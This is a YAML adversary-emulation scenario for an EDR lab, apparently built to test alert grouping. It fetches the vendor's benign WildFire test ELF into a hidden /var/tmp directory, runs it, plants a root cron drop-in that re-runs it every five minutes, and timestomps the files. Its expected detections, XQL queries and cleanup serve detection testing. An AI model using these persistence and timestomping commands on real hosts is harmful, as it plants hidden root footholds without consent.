@@ -1,0 +1,294 @@
+scenario_id: SIM-EDR-023
+name: "Linux Cron Foothold — WildFire Test ELF Dropper Re-Executed on a Schedule, Grouped Into One Case"
+version: "1.0"
+status: active
+
+plane: EDR
+detection_types:
+  - ABIOC
+  - Prevention
+  - BIOC
+  - XQL
+  - Correlation
+
+# ── UC/TC Alignment ─────────────────────────────────────────────────────────
+uc_ref: UCS-IR-01
+tc_ref: TC-IR-02
+tc_refs:
+  - TC-IR-02
+  - TC-EDR-03
+  - TC-EDR-05
+pov_scenario_id: POV-SC-006
+uc_name: "Incident Response"
+tc_name: "Demonstrate issue grouping consolidates related alerts into unified incidents"
+
+mitre_tactic: "TA0003"
+mitre_tactic_name: "Persistence"
+mitre_technique: "T1053.003"
+mitre_technique_name: "Scheduled Task/Job: Cron"
+additional_techniques:
+  - technique: "T1105"
+    name: "Ingress Tool Transfer"
+  - technique: "T1036.005"
+    name: "Masquerading: Match Legitimate Resource Name or Location"
+  - technique: "T1564.001"
+    name: "Hide Artifacts: Hidden Files and Directories"
+  - technique: "T1070.006"
+    name: "Indicator Removal: Timestomp"
+
+threat_report: "Unit42 - TeamTNT Targets Exposed Docker APIs"
+threat_report_url: "https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The operator holds a root shell (stolen SSH session) and plants a cron
+# foothold that re-runs a dropped binary every five minutes. cgo_anchor labels
+# SimCore's own causality graph and sets the root shell's argv[0]; it does NOT
+# change the tenant's CGO. In the 2026-11-11 lab every beacon-run step carried
+# causality_actor_process_image_name = cortexsim-agent, and every cron-run
+# child carries cron. The re-executions are therefore a SECOND causality chain.
+# They join the first one's case through shared artifacts (host, and the
+# payload's SHA256), not through a shared causality_id.
+cgo_anchor:
+  image_name: "sshd"
+  primary_username: "root"
+
+execution_identity:
+  default: root
+  options:
+    - root
+
+# Pull only. A push bundle runs the scenario cleanup on exit (`trap cleanup
+# EXIT`), which would delete the cron foothold ~40 s after step-03 plants it,
+# before the re-executions this scenario exists to show.
+push_supported: false
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Endpoint Signal Injection & Incident Grouping"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 80
+  unit: "%"
+success_criteria: |
+  The chain is built so that its alerts can group: only Medium-or-higher
+  issues create a case or join one (docs/product-mechanics/ledger.yml, row
+  INC). Low issues stand alone however well the causality is wired. The
+  Medium+ alerts here are the agent's Local Analysis verdict on the dropped
+  WildFire test ELF (HIGH, observed in this lab on 2026-11-11 as case 51877)
+  and three custom BIOCs plus one correlation rule that the operator installs
+  at Medium before the run (the install list is on TTP-2026-0198 and in
+  docs/lab/2026-11-11-persistence-grouping-lab-run.md).
+  PASS: at least 80% of the eight declared step-detections are observed, AND
+  every Medium+ issue the run raises on the endpoint carries ONE case_id. The
+  case is the beacon-chain issues (Local Analysis, cron drop-in, timestomp)
+  plus the cron-chain re-executions plus CR-EDR-0023.
+  The ABIOC is a built-in Low "XDR Analytics BIOC" alert. It is scored for
+  detection but never expected inside the case.
+  Rarity caveat: the built-in ABIOC judges rarity, and this host already
+  reached wildfire.paloaltonetworks.com on 2026-11-11, so it may read missed
+  while the tenant is healthy. The 80% bar allows that one miss (7 of 8).
+  The two XQL rows are scored only by Tier-2 verify
+  (`POST /api/runs/{id}/verify`), which looks back one hour from when it runs:
+  verify within the hour.
+  Dedup caveat: Local Analysis issues are deduplicated over one hour. Do not
+  run this within an hour of any other execution of the same test ELF on the
+  host. The cron job re-runs the ELF for 45 minutes, so a block-mode paired
+  run needs about 1h45m after launch.
+  tenant-verified: 0 — no run of this scenario has executed against a live
+  Cortex tenant; authored is not proven.
+moat_tier: "MOAT"
+
+infra_modules_needed:
+  - base
+  - edr
+
+steps:
+  - id: step-01
+    name: "Retrieve the official WildFire test ELF into a hidden /var/tmp directory"
+    # What the sensor records (2026-11-11 lab, SIM-CDR-012 step-01 on the same
+    # host): curl's PROCESS_START with the -o path, a FILE_CREATE_NEW/WRITE on
+    # the target, and a NETWORK_STREAM_CONNECT to wildfire.paloaltonetworks.com.
+    # That connect raised the built-in "UNIX LOLBIN process connected to a rare
+    # external host" ABIOC (Low, no case).
+    command: |
+      # Lab-safe: the only download is Palo Alto Networks' official WildFire
+      # test ELF, a benign file built to be classified malicious.
+      set -eu
+      D=/var/tmp/.cortexsim-ice
+      mkdir -p "$D"
+      chmod 700 "$D"
+      curl -fsSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o "$D/kworker-ice"
+      chmod 755 "$D/kworker-ice"
+      sha256sum "$D/kworker-ice"
+      echo "[CortexSim] SIM-EDR-023 step-01: WildFire test ELF staged as $D/kworker-ice"
+    identity: root
+    mitre_technique: "T1105"
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "Built-in XDR Analytics BIOC (Low, no case): curl connects to wildfire.paloaltonetworks.com, a host this tenant rarely reaches — observed on this endpoint 2026-11-11 (issue 1500447)"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: abioc-unix-lolbin-process-connected-to-a-rare-external-host
+      - plane: EDR
+        type: XQL
+        description: "Validation — curl retrieves the WildFire test ELF into a hidden /var/tmp directory"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: xql-edr-023-wildfire-test-elf-retrieved-into-hidden-var-tmp-directory
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "curl" and action_process_image_command_line contains "wildfire.paloaltonetworks.com/publicapi/test/elf"
+          | filter action_process_image_command_line contains "/var/tmp/.cortexsim-ice/kworker-ice"
+          | fields _time, agent_hostname, actor_causality_id, action_process_image_command_line
+
+  - id: step-02
+    name: "Execute the dropped ELF from the hidden directory"
+    # What the sensor records (2026-11-11 lab, draft run b83b956e on this
+    # host): PROCESS_START of the ELF from /var/tmp/.<dir>/, then the agent's
+    # Local Analysis verdict — "Local Analysis Malware", HIGH, action
+    # REPORTED under the endpoint's report-mode policy, grouped as case
+    # 51877. This is the run's case seed.
+    # Exit code: 0 when the ELF ran (report mode; the lab ELF prints "Sample
+    # Executed Successfully." and exits 0). Non-zero only when the exec did
+    # not happen (126/127: blocked or noexec) or the agent killed it (>= 129,
+    # a signal). The kill is the host witness a block-mode paired run needs,
+    # so it is never masked.
+    command: |
+      set -eu
+      sleep 40   # dwell: back-to-back steps lost telemetry in this lab (2026-11-11)
+      D=/var/tmp/.cortexsim-ice
+      echo "[CortexSim] SIM-EDR-023 step-02: executing $D/kworker-ice at $(date -u +%FT%TZ)"
+      rc=0
+      timeout 20 "$D/kworker-ice" || rc=$?
+      echo "[CortexSim] exec rc=$rc"
+      case "$rc" in
+        126|127) echo "[CortexSim] the ELF did not execute (rc=$rc): blocked or noexec" >&2; exit "$rc" ;;
+      esac
+      [ "$rc" -lt 129 ] || exit "$rc"
+      exit 0
+    identity: root
+    mitre_technique: "T1036.005"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: Prevention
+        # prevent: a block-mode paired run grades the kill (two witnesses);
+        # under the lab's report-mode policy it is scored as a detect.
+        outcome: prevent
+        description: "Agent Local Analysis verdict on the dropped test ELF — HIGH; reported under report mode (scored as detected), prevented under block mode; the case seed"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: prevention-local-analysis-malware
+      - plane: EDR
+        type: XQL
+        description: "Validation — a binary executes from a hidden directory under /var/tmp"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: xql-edr-023-dropped-elf-executed-from-hidden-var-tmp-directory
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_path = "/var/tmp/.cortexsim-ice/kworker-ice"
+          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, action_process_image_path, action_process_image_sha256
+
+  - id: step-03
+    name: "Plant a self-expiring cron drop-in that re-runs the payload every five minutes"
+    # What the sensor records: FILE_CREATE_NEW/WRITE on /etc/cron.d/cortexsim-ice
+    # by the step shell, then — every five minutes for 45 minutes — cron
+    # spawning `sh -c /bin/sh /var/tmp/.cortexsim-ice/ice-run.sh`. In this lab
+    # cron-run jobs record actor_process_image_name = cron and
+    # causality_actor_process_image_name = cron. The job deletes its own cron
+    # file when its deadline passes, so a forgotten run cleans itself up.
+    command: |
+      set -eu
+      sleep 40   # dwell
+      D=/var/tmp/.cortexsim-ice
+      expr "$(date +%s)" + 2700 > "$D/expires-at"
+      cat > "$D/ice-run.sh" <<'EOF'
+      #!/bin/sh
+      D=/var/tmp/.cortexsim-ice
+      now=$(date +%s)
+      exp=$(cat "$D/expires-at" 2>/dev/null || echo 0)
+      if [ "$now" -ge "$exp" ]; then
+        rm -f /etc/cron.d/cortexsim-ice
+        echo "expired $now" >> "$D/runs.log"
+        exit 0
+      fi
+      echo "run $now $(id -un)" >> "$D/runs.log"
+      uname -n >> "$D/runs.log"
+      timeout 20 "$D/kworker-ice" >> "$D/runs.log" 2>&1 || true
+      EOF
+      chmod 700 "$D/ice-run.sh"
+      cat > /etc/cron.d/cortexsim-ice <<'EOF'
+      # CortexSim SIM-EDR-023 foothold: self-expires 45 min after install; the scenario cleanup removes it
+      */5 * * * * root /bin/sh /var/tmp/.cortexsim-ice/ice-run.sh
+      EOF
+      chmod 644 /etc/cron.d/cortexsim-ice
+      cat /etc/cron.d/cortexsim-ice
+    identity: root
+    mitre_technique: "T1053.003"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Custom BIOC (operator-installed, Medium): a shell writes a cron drop-in under /etc/cron.d"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: bioc-edr-023-cron-drop-in-written-by-shell-outside-package-manager
+      - plane: EDR
+        type: BIOC
+        description: "Custom BIOC (operator-installed, Medium): cron runs a payload from a hidden /var/tmp directory — fires on each re-execution, a second causality chain rooted at cron"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: bioc-edr-023-cron-runs-payload-from-hidden-var-tmp-directory
+
+  - id: step-04
+    name: "Timestomp the cron drop-in and payload to blend in"
+    # What the sensor records: PROCESS_START of touch with -r naming the cron
+    # drop-in and the hidden payload directory.
+    command: |
+      set -eu
+      sleep 40   # dwell
+      touch -r /etc/hostname /etc/cron.d/cortexsim-ice /var/tmp/.cortexsim-ice/kworker-ice /var/tmp/.cortexsim-ice/ice-run.sh
+      ls -la /etc/cron.d/cortexsim-ice /var/tmp/.cortexsim-ice/
+    identity: root
+    mitre_technique: "T1070.006"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Custom BIOC (operator-installed, Medium): touch -r/-t/-d rewrites timestamps on a cron or hidden /var/tmp persistence artefact"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: bioc-edr-023-persistence-artifact-timestomped-with-touch-reference
+      - plane: EDR
+        type: Correlation
+        description: "Correlation CR-EDR-0023 (operator-installed, Medium, scheduled every 10 min over 1 h): on one agent, a shell-written cron drop-in AND a cron-run payload from a hidden /var/tmp directory — the planted-then-re-executed foothold as one issue mapped to Host Name + Agent ID"
+        ttp_ref: "TTP-2026-0198"
+        detection_id: CR-EDR-0023
+
+cleanup:
+  commands:
+    - "rm -f /etc/cron.d/cortexsim-ice"
+    - "rm -rf /var/tmp/.cortexsim-ice"
+    - "echo 'cortexsim-edr-023-cleanup-complete'"
+
+author: "Henry Reed"
+created: "2026-11-11"
+last_updated: "2026-11-11"
+tags:
+  - edr
+  - linux
+  - persistence
+  - cron
+  - wildfire-test-file
+  - incident-grouping
+  - long-dwell
